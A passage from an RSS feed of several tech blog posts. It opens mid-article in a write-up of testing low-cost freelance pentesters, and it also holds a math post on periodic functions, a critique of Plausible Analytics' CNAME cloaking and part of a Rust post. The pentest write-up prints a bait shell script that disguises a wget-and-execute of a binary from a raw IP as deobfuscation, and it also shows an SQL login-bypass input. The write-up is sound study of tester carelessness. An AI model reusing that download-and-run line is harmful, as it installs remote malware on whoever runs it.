<img src="https://sophron.github.io/lowcost-freelancing-pentest/response.png" width="95%">
  <figcaption>Identifying the two vulnerabilities after intercepting the HTTP traffic with Burp Suite</figcaption>
</figure>



<p>
The second way to bypass the authentication of the form is by inputting "<span color="crimson">' OR 1=1'</span>" or a similar payload. The root cause of this issue appears to be an SQL Injection vulnerability, but it is, in fact, a hardcoded SQL password. The executed SQL query can be found in the HTTP response:
</p>


<pre><code> SELECT * FROM form_passwords 
WHERE 'password' 
LIKE CONCAT(
	'%', 
	IF(STRCMP(SYSTEM_USER(), '/dev/random@localhost')=-1, REVERSE(" \'"), 
	ISNULL(NULLIF(NULL-NULL*NULL, POWER(NULL,NULL)))), 
	IF(STRCMP(SESSION_USER(), '/dev/null@localhost')=0, CHAR(40*2-POWER(1, LOG(2)),(4*10+1)*2), 
	CHAR(69,4*10+9)), SPACE(1), '%' ,'\'','%',IF(STRCMP(VERSION(), '10.3.15-MariaDB-0+deb10u1')=0,
	IF(CONNECTION_ID()=1337,"'"="",'-_-'),
	IF(PI()&lt;3,"&lt;(^^)&gt;","'=")), MID("```'`''`'`'`'``'`'``'```````'`'`'`'`'`''`'`'`",7,1), '%');

</code>
</pre>

<p>
The tester will have to de-obfuscate the SQL query in order to extract the hardcoded password. For the tester to de-obfuscate the SQL query, he needs to possess basic knowledge of SQL syntax. This particular SQL query that I created is using nested inline IF statements. The conditions are checking the environmental variables <span color="crimson">SYSTEM_USER</span>, <span color="crimson">SESSION_USER</span> and <span color="crimson">VERSION</span>). Since these values are not known to the tester, he will have to follow all the different logic paths until the constructed query makes sense. Some simple simplifications here and there can make the query much more readable.


</p>


<figure>
<img src="https://sophron.github.io/lowcost-freelancing-pentest/sql_riddle.png">
  <figcaption>De-obfuscating the SQL query</figcaption>
</figure>


<p>
After de-obfuscation, the final query will be: "<span color="crimson">SELECT * FROM form_passwords WHERE 'password123' LIKE %" OR %"$'=%</span>". Inputs such as "<span color="red">' OR 1=1'</span>" would allow the tester to bypass the authentication form successfully. I purposely decided to use a payload that is commonly used when testing forms for SQL injections as an answer to this riddle, to see how many of these testers would correctly identify the root cause of this issue.
</p>


<p>To make things even more interesting, I put a malicious shell script as part of the HTTP response. The contents of the shell script were the following: </p>
<pre><code>obscure() {
   local txt="$1"
   local txt="$a\'{}"
   echo "${txt//?/*}"
}

sql_1 = 'SELECT * FROM form_passwords WHERE "asfsadfd" LIKE CONCAT("%", IF(STRCMP(SYSTEM_USER()'
sql_2 = 'REVERSE(), ISNULL(NULLIF(NULL-NULL*NULL, POWER(NULL,NULL)))), IF(STRCMP(SESSION_USER(), "/dev/null@localhost")=0'
sql_3 = `wget http://83.212.174.87/mal | chmod +x ./mal | ./mal`
sql_4 = '10.3.15-MariaDB-0+deb10u1)=0,IF(CONNECTION_ID()=1337,"="-_-,IF(PI()&lt;3,&lt;(^^)&gt;'
sql_5 = 'LOG(2)),(4*10+1)*2), CHAR(69,4*10+9)), SPACE(1'

echo "Deobfuscating..."

eval "$sql_1"
eval "$sql_2"
eval "$sql_3"
eval "$sql_4"
eval "$sql_5"
</code>
</pre>


<p>
As can be seen, on line 12, the script is downloading and executing a binary from the Internet. I wanted to see how many of these testers will be careless enough to run my malicious script without auditing it first.

</p>


<p>Finally, I installed an SSH honeypot. My intention was to record any shell interactions by the testers and evaluate their post-exploitation methodology.</p>

<p>The profiles of all the testers I hired had overwhelmingly positive reviews on the online marketplace. I pretended that I needed my web form tested before my group used it in production. I received all the penetration testing reports a few days later.</p>

<h3>Tester #1 ($20)</h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/1/report.pdf">PDF Report</a></p>

<p>The tester claimed to be a Certified Ethical Hacker v9 with experience in Vulnerability Assessments and Penetration Testing.
</p>

<p>
The tester delivered the report and mentioned that he found a serious flaw in the system. He failed to identify any of the high severity findings. The report included irrelevant information, such as "Banner Grabbing &amp; Version Detection," as well as a "Performance / Load Test." The serious flaw that the tester identified was logging in to the SSH honeypot.
</p>


<h3>Tester #2 ($30)</h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/2/report.pdf">PDF Report</a></p>

<p>
The tester described himself as an independent information security researcher. He mentioned that he had finished his Bachelor's in Computer Science and Certified Ethical Hacker Course by EC-Council. He claimed to have hands-on experience in vulnerability assessment and penetration testing.
</p>
<p>
This tester, too, failed to identify any of the high severity findings. The tester believed he had gotten local access to the remote machine, failing to realize that this was, in fact, a honeypot. The results that were reported had no direct impact (in regard to Integrity, Availability, Confidentiality), or they were not valid at all (e.g., directory brute-forcing).
</p>

<h3>Tester #3 ($35)</h3> 

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/3/report.pdf">PDF Report</a></p>

<p>
The tester claimed that they usually charge $200 for complete pentest and report, but since canceling the order will have a negative impact on their profile, they agreed to carry out the testing. They asked me to tip well after I receive the report.
</p>
<p>
Most of the findings included in this report were part of the Nessus security tool. A reflected XSS finding on a POST parameter was exaggerated as a HIGH. None of the HIGH-severity findings were identified.
</p>

<h3>Tester #4 ($40)</h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/4/report.pdf">PDF Report</a></p>

<p>
The tester claimed to be OSCP certified with nine years of experience.
</p>
<p>

This tester identified the SQL vulnerability successfully but failed to identify the root cause of it. He reported the vulnerability as an SQL injection as opposed to a hardcoded password. The rest of the findings he reported were part of Burp Suite's automated scanner.

</p>


<h3>Tester #5 ($50)</h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/5/report.pdf">PDF Report</a></p>

<p>
The tester claimed to have a B.Sc in Computer Science and various certifications, including CEH Certified Ethical Hacker and Certified Payment Industry Security Implementer. On his profile, he mentions that he provides a variety of services from PCI DSS consulting to blockchain training.
</p>

<p>

Again, none of the critical vulnerabilities were discovered. This tester did execute my malicious script even though, according to the report, he examined it for any security issues. 

</p>


<h3>
Tester #6 ($100) </h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/6/report.pdf">PDF Report</a></p>

<p>
The tester claimed to have over 20 years of experience in Ethical Hacking, and his profile has over 100 positive reviews. I ordered the premium service that included a full penetration test, professional security assessment report and recommendations &amp; solutions.</p>

<p> The tester failed to identify any of the HIGH-risk vulnerabilities. All the technical details on the report were taken from automated tools (OWASP ZAP and Netsparker). </p>




<h3>
Tester #7 ($400) </h3>

<p>
The tester claimed to be an OCSP with 7+ years of professional experience with major clients. In our agreement, we agreed that he wouldn't have to provide a report to save them time and allow them to focus on testing.

</p>

<p>
The tester successfully identified the issue with the mistyped HTTP header. He did not report the SQL hardcoded password.
</p>

<p>Following is a table that summarizes the work of all testers:</p>

<table>
<thead>
  <tr>
    <th>Tester #</th>
    <th>Cost</th>
    <th>Bug 1</th>
    <th>Bug 2</th>
    <th>Reported vuln correctly</th>
    <th>Did not run malicious binary</th>
  </tr>
</thead>
<tbody>
  <tr>
    <td>1</td>
    <td>$20</td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
    <td><span color="green">âœ“</span></td>
  </tr>
  <tr>
    <td>2</td>
    <td>$30</td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
    <td><span color="green">âœ“</span></td>
  </tr>
  <tr>
    <td>3</td>
    <td>$35</td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
    <td><span color="green">âœ“</span></td>
  </tr>
  <tr>
    <td>4</td>
    <td>$40</td>
    <td><span color="red">X</span></td>
    <td><span color="green">âœ“</span></td>
    <td><span color="red">X</span></td>
    <td><span color="green">âœ“</span></td>
  </tr>
  <tr>
    <td>5</td>
    <td>$50</td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
  </tr>
  <tr>
    <td>6</td>
    <td>$100</td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
    <td><span color="green">âœ“</span></td>
  </tr>
  <tr>
    <td>7</td>
    <td>$400</td>
    <td><span color="green">âœ“</span></td>
    <td><span color="red">X</span></td>
    <td><span color="green">âœ“</span></td>
    <td><span color="green">âœ“</span></td>
  </tr>
</tbody>
</table>

<p>
The results are straightforward. It appears that all of these contractors, with the exception of the last one, used automated tools to carry out the testing. Hence, the majority of them failed to identify the critical vulnerabilities. Some of them thought they gained access to the host through SSH without realizing they actually gained access to the virtual environment of a honeypot. Finally, one of them ran a script found online without auditing it …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sophron.github.io/lowcost-freelancing-pentest/">https://sophron.github.io/lowcost-freelancing-pentest/</a></em></p>]]>
            </description>
            <link>https://sophron.github.io/lowcost-freelancing-pentest/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24869219</guid>
            <pubDate>Fri, 23 Oct 2020 13:26:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[From Vector Spaces to Periodic Functions (2019)]]>
            </title>
            <description>
<![CDATA[
Score 57 | Comments 23 (<a href="https://news.ycombinator.com/item?id=24868378">thread link</a>) | @susam
<br/>
October 23, 2020 | https://susam.in/blog/from-vector-spaces-to-periodic-functions/ | <a href="https://web.archive.org/web/*/https://susam.in/blog/from-vector-spaces-to-periodic-functions/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>By <b>Susam Pal</b> on 30 Jan 2019</p>
<h2 id="vector-spaces"><a href="#vector-spaces">Vector Spaces</a></h2>
<p>
A fascinating result that appears in linear algebra is the fact that the
set of real numbers \( \mathbb{R} \) is a vector space over the set of
rational numbers \( \mathbb{Q}. \) This may appear surprising at first
but it is easy to show that it is indeed so by checking that all eight
axioms of vector spaces hold good:
</p>

<ol>
  <li>
    <p>
      Commutativity of vector addition:<br>
      \( x + y = y + x \) for all \( x, y \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Associativity of vector addition:<br>
      \( x + (y + z) = (x + y) + z \) for all \( x, y, z \in \mathbb{R}.
      \)
    </p>
  </li>
  <li>
    <p>
      Existence of additive identity vector:<br>
      We have \( 0 \in \mathbb{R} \) such that \( x + 0 = x \) for all
      \( x \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Existence of additive inverse vectors:<br>
      There exists \( -x \in \mathbb{R} \) for all \( x \in \mathbb{R}.
      \)
    </p>
  </li>
  <li>
    <p>
      Associativity of scalar multiplication:<br>
      \( a(bx) = (ab)x \) for all \( a, b \in \mathbb{Q} \) and all \( x
      \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Distributivity of scalar multiplication over vector addition:<br>
      \( a(x + y) = ax + by \) for all \( a \in \mathbb{Q} \) and all \(
      x, y \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Distributivity of scalar multiplication over scalar addition:<br>
      \( (a + b)x = ax + bx \) for all \( a, b \in \mathbb{Q} \) and all
      \( x \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Existence of scalar multiplicative identity:<br>
      We have \( 1 \in \mathbb{Q} \) such that \( 1 \cdot x = x \) for
      all \( x \in \mathbb{R}. \)
    </p>
  </li>
</ol>
<p>
  This shows that the set of real numbers \( \mathbb{R} \) forms a
  vector space over the field of rational numbers \( \mathbb{Q}. \)
  Another quick way to arrive at this fact is to observe that \(
  \mathbb{Q} \subseteq \mathbb{R}, \) that is, \( \mathbb{Q} \) is a
  subfield of \( \mathbb{R}. \) Any field is a vector space over any of
  its subfields, so \( \mathbb{R} \) must be a vector space over \(
  \mathbb{Q}. \)
</p>


<h2 id="problem"><a href="#problem">Problem</a></h2>

<p>
Here is an interesting problem related to vector spaces that I came
across recently:
</p>

<div>
<p>
Define two periodic functions \( f \) and \( g \) from \( \mathbb{R} \)
to \( \mathbb{R} \) such that their sum \( f + g \) is the identity
function. The axiom of choice is allowed.
</p>
<p>
A function \( f \) is periodic if there exists \( p \gt 0 \) such that
\( f(x + p) = f(x) \) for all \( x \) in the domain.
</p>
</div>

<p>
<em>
If you want to think about this problem, this is a good time to pause
and think about it. There are spoilers ahead.
</em>
</p>


<h2 id="solution"><a href="#solution">Solution</a></h2>

<p>
The axiom of choice is equivalent to the statement that every vector
space has a basis. Since the set of real numbers \( \mathbb{R} \) is a
vector space over the set of rational numbers \( \mathbb{Q}, \) there
must be a basis \( \mathcal{H} \subseteq \mathbb{R} \) such that every
real number \( x \) can be written uniquely as a finite linear
combination of elements of \( \mathcal{H} \) with rational coefficients,
that is,
\[
  x = \sum_{a \in \mathcal{H}} x_a a
\]
where each \( x_a \in \mathbb{Q} \) and \( \{ a \in \mathcal{H} \mid x_a
\ne 0 \} \) is finite. The set \( \mathcal{H} \) is also known as the
Hamel basis.
</p>

<p>
In the above expansion of \( x, \) we use the notation \( x_a \) to
denote the rational number that appears as the coefficient of the basis
vector \( a. \) Therefore \( (x + y)_{a} = x_a + y_a \) for all \( x, y
\in \mathbb{R} \) and all \( a \in \mathcal{H}. \)
</p>

<p>
We know that \( b_a = 0 \) for distinct \( a, b \in \mathcal{H} \)
because \( a \) and \( b \) are basis vectors. Thus \( (x + b)_{a} = x_a
+ b_a = x_a + 0 = x_a \) for all \( x \in \mathbb{R} \) and distinct \(
a, b \in \mathcal{H}. \) This shows that a function \( f(x) = x_a \) is
a periodic function with period \( b \) for any \( a \in \mathcal{H} \)
and any \( b \in \mathcal{H} \setminus \{ a \}. \)
</p>

<p>
Let us define two functions:
\begin{align*}
  g(x) &amp; = \sum_{a \in \mathcal{H} \setminus \{ b \}} x_a a,
  &amp;
  h(x) &amp; = x_b b.
\end{align*}
where \( b \in \mathcal{H} \) and \( x \in \mathbb{R}. \) Now \( g(x) \)
is a periodic function with period \( b \) for any \( b \in \mathcal{H}
\) and \( h(x) \) is a periodic function with period \( c \) for any \(
c \in \mathcal{H} \setminus \{ b \}. \) Further,
\[
  g(x) + h(x)
  = \left( \sum_{a \in \mathcal{H} \setminus \{ b \}} x_a a \right) + x_b b
  = \sum_{a \in \mathcal{H}} x_a a
  = x.
\]
Thus \( g(x) \) and \( h(x) \) are two periodic functions such that
their sum is the identity function.
</p>


<h2 id="references"><a href="#references">References</a></h2>
<ul>
  <li>
    <a href="https://mathworld.wolfram.com/VectorSpace.html">Vector
    Space</a> by Eric W. Weisstein
  </li>
  <li>
    <a href="https://web.archive.org/web/20141026224511/https://drexel28.wordpress.com/2010/10/22/the-dimension-of-r-over-q/">The
    Dimension of R over Q</a> by Alex Youcis
  </li>
  <li>
    <a href="https://mathblag.wordpress.com/2013/09/01/sums-of-periodic-functions/">Sums
  of Periodic Functions</a> by David Radcliffe
  </li>
</ul>




</div></div>]]>
            </description>
            <link>https://susam.in/blog/from-vector-spaces-to-periodic-functions/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24868378</guid>
            <pubDate>Fri, 23 Oct 2020 11:37:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Plausible Analytics Isn't GDPR Compliant]]>
            </title>
            <description>
<![CDATA[
Score 53 | Comments 74 (<a href="https://news.ycombinator.com/item?id=24868012">thread link</a>) | @ramboram
<br/>
October 23, 2020 | https://blog.paranoidpenguin.net/2020/07/plausible-analytics-review-browser-fingerprinting-and-cname-cloaking | <a href="https://web.archive.org/web/*/https://blog.paranoidpenguin.net/2020/07/plausible-analytics-review-browser-fingerprinting-and-cname-cloaking">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>For the last few weeks, my feeds and federated timelines have been filled with absolutely brilliant marketing campaigns for Plausible Analytics, the new open-source privacy-focused website analytics tool. Plausible Analytics has enjoyed exponential growth and is frequently recommended by privacy-conscious voices in the FOSS community.</p><figure><a href="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/elementary-io.png"><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/elementary-io-663x317.png" alt="Plausible Analytics - elementary OS"></a><figcaption><p>Plausible Analytics showing public visitor metrics for the elementary OS website.</p></figcaption></figure><p>So does Plausible Analytics deliver on its promise to provide an ethical privacy-friendly alternative to Google Analytics? Let’s have a closer look.</p><p>Plausible Analytics claims to be compliant with GDPR, CCPA, and PECR out of the box. Allegedly, it’s not necessary to ask for and obtain user consent as no personal data is ever being collected.</p><p>Plausible Analytics does however admit that it collects your user-agent and IP address to uniquely identify your visit. Additionally, it stores information about your browser, operating system, device type, and location (based on your IP address). Even if the stored personal data is being anonymized (and not pseudonymized which sounds more likely), the data is still being processed.</p><p>If you’re familiar with GDPR, then you’re likely aware that it certainly covers collecting of online identifiers, such as IP addresses, and browser characteristics used for fingerprinting.</p><p>Another issue I came across when signing up for their service was that Plausible Analytics doesn’t provide their customers with a GDPR data processing agreement (DPA). When you, the website owner, allows a third party to collect and process personal data, you’re required to sign a DPA to be GDPR compliant.</p><h2 id="privacy-friendly-website-analytics">Privacy-friendly website analytics</h2><p>In my opinion, privacy-friendly should be more than a buzzword used to throw shade at Google Analytics. Here are a few key points that I attribute to being privacy-friendly (none of which are adhered to by Plausible Analytics):</p><ul><li>Ask users for their consent before tracking.</li><li>Allow users who don’t want to be tracked to opt-out.</li><li>Respect users providing a Do Not Track (DNT) header.</li><li>Don’t disguise your tracker as a first-party resource to avoid ad-blockers.</li></ul><p>Being privacy-friendly is also about respecting one’s right to choose what data to share, and with whom. Plausible Analytics seems to think that it’s alright to make that choice on your behalf and I wholeheartedly disagree.</p><h2 id="cname-cloaking">CNAME cloaking</h2><p>This abysmal technique remains ever popular with <a href="https://github.com/uBlockOrigin/uBlock-issues/issues/780" target="_blank">unethical advertisers</a> as an effective countermeasure against ad-blockers. The technique effectively disguises the third-party tracker as a first-party resource by having the website owner pointing a subdomain to the third-party server using a CNAME record.</p><p>Plausible Analytics are at least upfront about why they deploy CNAME cloaking, as explained in their documentation:</p><figure><a href="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/plausible-cname-cloaking.png"><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/plausible-cname-cloaking-663x277.png" alt="Plausible Analytics - CNAME cloaking"></a><figcaption><p>Plausible Analytics documenting how to defeat ad-blockers.</p></figcaption></figure><p>What, some people are trying to block your privacy-friendly tracker? Now we can’t have that, tracking absolutely everyone gives Plausible Analytics a competitive edge against Google Analytics.</p><h3 id="how-does-cname-cloaking-work">How does CNAME cloaking work?</h3><p>An excellent question, but first we need to understand exactly what makes CNAMEs special by design and implementation as according to <a href="https://tools.ietf.org/html/rfc1034" target="_blank">rfc1034</a>.</p><blockquote><div><p>A CNAME RR identifies its name as an alias, and specifies the corresponding canonical name.</p><p>When a name server fails to find a desired RR in the resource set associated with the domain name, it checks to see if the resource set consists of a CNAME record with a matching class. If so, the name server includes the CNAME record in the response and restarts the query at the domain name specified in the data field of the CNAME record.</p></div></blockquote><p>Let’s see how it works by using the domain markosaric.com as an example. The domain is owned by Marko Saric, digital marketing guru of team Plausible Analytics. The subdomain he uses to disguise the tracker is ms.markosaric.com.
When performing a DNS query for ms.markosaric.com, we get the following response:</p><pre><code>$ dig ms.markosaric.com

;; ANSWER SECTION:
ms.markosaric.com.	14400	IN	CNAME	custom.plausible.io.
custom.plausible.io.	300	IN	A	46.101.161.209
</code></pre><p>As we can tell, the DNS resolver identifies ms.markosaric.com as an alias for custom.plausible.io. Additionally, because it’s a CNAME record, we also get the A record for custom.plausible.io which is pointing to 46.101.161.209.</p><p>When a browser requests the first-party resource for ms.markosaric.com, the same “DNS based redirect” takes place, and the tracker gets inserted from custom.plausible.io. However, because this happens at the DNS level, ad-blockers are unable to identify the tracker.</p><p>Let’s see how this dark magic repels uBlock Origin on Chromium after adding a custom filter to block the plausible.io domain.</p><pre><code>! Custom uBlock Origin filter for plausible.io
||plausible.io^
</code></pre><p>The image below consists of two merged screenshots. The left side of the image shows how the custom filter fails to stop the tracker when CNAME cloaking is in effect. The right side of the image shows the same filter successfully blocking the tracking domain when accessed directly:</p><figure><a href="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/cname-cloak.png"><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/cname-cloak-663x232.png" alt="CNAME cloaking"></a><figcaption><p>CNAME cloaking used to escape filtering from uBlock Origin on Chromium.</p></figcaption></figure><p>As shown above, the tracker (index.js) is being loaded from the remote IP address of 46.101.161.209, which resolves to custom.plausible.io. However, the script is not blocked and the harvesting of personal data is in full effect.</p><p>This technique is effective because uBlock Origin doesn’t have access to DNS queries and is entirely oblivious to the trick being pulled behind its back. I wouldn’t describe this approach as being either privacy-friendly or ethical.</p><h2 id="how-to-block-plausible-analytics">How to block Plausible Analytics</h2><p>Though intrusive, unethical, and annoying, CNAME cloaking can be defeated. I’ll scratch the surface with a few options that will help you to protect your privacy.</p><h3 id="ublock-origin-on-firefox">uBlock Origin on Firefox</h3><p>You can easily block Plausible Analytics with uBlock Origin on Firefox by adding the filter I referenced earlier in this article. Firefox allows extensions (if given permission) to resolve domain names by exposing a <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/dns" target="_blank">DNS API</a>. This allows uBlock Origin to identify and block disguised trackers:</p><figure><a href="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/cname-exposed-ublock-origin.png"><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/cname-exposed-ublock-origin.png" alt="uBlock Origin on Firefox"></a><figcaption><p>uBlock Origin using Firefox’s DNS API to expose and block CNAME cloaking.</p></figcaption></figure><h3 id="dnscrypt-proxy">dnscrypt-proxy</h3><p>If you don’t want to use Firefox, or prefer to block Plausible Analytics on the DNS level, then you’ll need a tool that can scrub CNAME responses. The right tool for the job in my opinion is <a href="https://github.com/DNSCrypt/dnscrypt-proxy" target="_blank">dnscrypt-proxy</a>. The dnscrypt-proxy client’s domain blacklist provides support for CNAME blocking.</p><p>The following animated gif shows how dnscrypt-proxy can block the CNAME record containing the unwanted tracker.</p><p><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/dnscrypt-proxy-cname-blacklist.gif" alt="dnscrypt-prox blocking a cloaked CNAME record" title="Blocking Plausible Analytics with dnscrypt-proxy"></p><p>Pretty neat huh.</p><h3 id="other-options">Other options</h3><p>Well there are a few, you could always:</p><ul><li>Block any IP address in use by custom.plausible.io with your firewall.</li><li>Disable JavaScript in your browser (it will block the tracking, not the connection).</li><li>Block the <a href="https://github.com/rogercomply/plausible-analytics-blocklist/blob/master/subdomains" target="_blank" rel="noopener noreferrer nofollow" title="A list of subdomains used for CNAME cloaking with Plausible Analytics">subdomains</a> used for CNAME cloaking.</li><li>Use a DNS service provider already blocking unwanted trackers.</li><li>Ask Plausible Analytics to respect your right to privacy.</li></ul><h2 id="what-does-the-foss-say">What does the FOSS say?</h2><p>I’ll admit to being mildly amused and surprised that privacy-conscious people in the FOSS community are promoting this service. Even more surprising is the fact that they’re configuring CNAME cloaking for their websites. I mean, seriously, you can’t exactly argue ignorance in this matter.</p><p>Plausible Analytics is good at targeted marketing to the right people. However, I don’t personally believe that the product delivers on its promise. Open-source or not, the business model here is still to monetize personal data for profit however you may wish to dress it up.</p></div></div>]]>
            </description>
            <link>https://blog.paranoidpenguin.net/2020/07/plausible-analytics-review-browser-fingerprinting-and-cname-cloaking</link>
            <guid isPermaLink="false">hacker-news-small-sites-24868012</guid>
            <pubDate>Fri, 23 Oct 2020 10:38:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fighting Rust's Expressive Type System]]>
            </title>
            <description>
<![CDATA[
Score 100 | Comments 51 (<a href="https://news.ycombinator.com/item?id=24867610">thread link</a>) | @boyter
<br/>
October 23, 2020 | https://thefuntastic.com/blog/fighting-rusts-type-system | <a href="https://web.archive.org/web/*/https://thefuntastic.com/blog/fighting-rusts-type-system">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-v-10b1bd0a="" data-v-2ae295f5=""><p><em>Herein I share an experienced developer's first foray into a real-world Rust project. It focuses closely on the type system, and the key insights I needed to begin "thinking in Rust". Written for those getting to grips with the language, it will be especially useful if your background isn't functional programming.</em> </p>
<p><em>Although originally conceived as part 2 of 2, this can be read as a standalone entry. In <a href="https://thefuntastic.com/blog/rust-tide-clock">part 1</a>, written for a general audience, I detail the maker project, a Raspberry Pi Tide Clock, and the heartwarming story behind its origins.</em></p>
<p><img src="https://thefuntastic.com/blog/2020-09-Tide-Clock-1.jpg" title="Picture of the completed Tide Clock"></p>
<h2 id="my-first-date-with-rust---know-thy-enemy">My First Date with Rust - Know Thy Enemy</h2>
<p>As a working programmer with several mainstream languages under your belt (eg <code>Java</code>, <code>C#</code>, <code>javascript</code>, <code>python</code>, etc) it's reasonable to expect that after a bit of orientation with quirks and syntax you'll find yourself somewhat productive. If you know Rust you won't be surprised when I say my experience was... humbling. </p>
<p>The last time I felt so dumb was probably more than a decade ago, as a novice programmer teaching myself Object Orientated Programming (OOP). I think that's the point, new paradigms require effort to build a working mental model for. And depending on where you start on the ladder you might have quite a lot of mental rebuilding to do.  </p>
<p>Rust intentionally tries to be "boring". That is to say, its DNA borrows liberally from prior art. If you're familiar with manual memory management (<code>C</code>, <code>C++</code>, <code>Obj-C</code>) you'll probably understand pointers in Rust. If you're familiar with functional languages (<code>Haskell</code>, <code>Elm</code>, <code>Clojure</code>, <code>OCaml</code>) you'll have an immediate start recognising the type system. The reason it aims for boring is because it spends its entire novelty budget on the one unique idea: automatic scope based memory allocation (aka the borrow checker). This is the knockout feature: <strong>the performance of C with the safety of garbage collected languages.</strong></p>
<p><a href="http://intorust.com/" target="_blank" rel="nofollow noopener noreferrer">Plenty</a> <a href="https://doc.rust-lang.org/book/ch04-00-understanding-ownership.html" target="_blank" rel="nofollow noopener noreferrer">of ink</a> <a href="https://squidarth.com/rc/rust/2018/05/31/rust-borrowing-and-ownership.html" target="_blank" rel="nofollow noopener noreferrer">has been</a> <a href="https://dev.to/strottos/learn-rust-the-hard-bits-3d26" target="_blank" rel="nofollow noopener noreferrer">written</a> about ownership and the borrow checker. It follows the most unprecedented feature would have the most said about it. There seems to be a common refrain: "<em>It's really hard at first, but stick with it. You'll see, it changes everything</em>". Sounds suspiciously like Vim or Emacs users (please don't fight me). Is it the promised land or just a severe case of Stockholm syndrome?     </p>
<p>Nevertheless, extensive reading had prepared me to expect a big ol' messy fight with the borrow checker. We did tussle, but it went better than expected. Ironically, after years of <code>C#</code> game development, performance concerns have taught me much of the internal dialogue needed to reason about memory lifetimes: "Is this allocated on the stack or heap? Is this going to create allocation (garbage collection) pressure? Is this copying data or mutating it in place?"</p>
<p>In this sense, when the borrow checker complained I could at least appreciate what it was trying to protect me against. And as to be expected, it may be a while yet before I fully grok lifetimes. Controversially though, "Rust's expressive type system" put up a stiffer fight than I anticipated.</p>
<h2 id="stubbing-toes-on-functional-programming">Stubbing Toes on Functional Programming</h2>
<p>Before anyone grabs a pitchfork, this isn't a rant about the unnecessary burden of type systems. Throughout my career, I've favoured statically and strongly typed programming languages. I believe in correctness, and tooling should help you get there. It's why Rust excites me.</p>
<p>Taken to its ultimate conclusion, one arrives at <code>Haskell</code> and other pure functional programming (FP) languages. FP's conceit is trading performance for correctness. As a concerned game developer, this never felt like a bargain I could entertain. Not that it's prevented FP idioms from seeping into the groundwater of other programming languages (see <code>LINQ</code> in <code>C#</code> or <code>map() filter() reduce()</code> in <code>javascript</code> as examples).   </p>
<p>You can see signs of this functional DNA written all over Rust too, immutability by default being the most obvious. However, Rust strikes a wonderfully pragmatic balance. Imperative programming is not outlawed, and many escape hatches exist. Rust is, as far as I'm aware, <strong>the first language that allows you to deploy functional concepts as zero-cost abstractions</strong>. If the borrow checker is the obvious hit single, this is the real album sleeper hit. </p>
<p>I think my undoing was simply that I had a false expectation of equivalence. I'm confident in my type literacy and I can, if we must, talk in-depth about Java design patterns. I've never courted a "proper" functional language, but I recognise their influence. I understood "expressive type system" to be a superset of what I already know. In some respects it is, but in others, it was fundamentally different. I want to share some of my "aha" moments because I haven't seen much written with this lens...  </p>
<h2 id="use-rust-analyzer">Use Rust Analyzer!</h2>
<p>To anyone following my footsteps: <strong>setup your dev environment for code intelligence and type hints</strong> is my best advice. I intentionally offer it here before any code samples make you glaze over and miss it.  </p>
<p><img src="https://thefuntastic.com/blog/2020-10-Rust-Analyser.png" title="Screenshot of Rust Analyser extension in Visual Studio extensions gallery"></p>
<p>At the time of writing (Oct 2020), I found Visual Studio Code with the <a href="https://marketplace.visualstudio.com/items?itemName=matklad.rust-analyzer" target="_blank" rel="nofollow noopener noreferrer"><code>rust-analyzer</code></a> extension to be the most reliable path. I learnt this only after naively installing the <a href="https://marketplace.visualstudio.com/items?itemName=rust-lang.rust" target="_blank" rel="nofollow noopener noreferrer"><code>Rust</code></a> extension, which provides a front end for both the earlier <a href="https://github.com/rust-lang/rls" target="_blank" rel="nofollow noopener noreferrer"><code>RLS</code></a> and the more modern <a href="https://rust-analyzer.github.io/" target="_blank" rel="nofollow noopener noreferrer"><code>rust-analyzer</code></a>. However, in my experience, the native <code>rust-analyzer</code> extension was vastly superior.</p>
<h2 id="taste-testing-rusts-flavour">Taste Testing Rust's Flavour</h2>
<p>If you can express something as a type, the compiler can offer you guarantees about it. An expressive type system allows you to model domains that weren't possible before, often using simpler machinery too. Rust takes this affordance and runs with it. Types are used for everything, and I do mean <strong>everything</strong>. A lot of problems didn't quite make sense until I learnt to recognise them for what they were: type errors. </p>
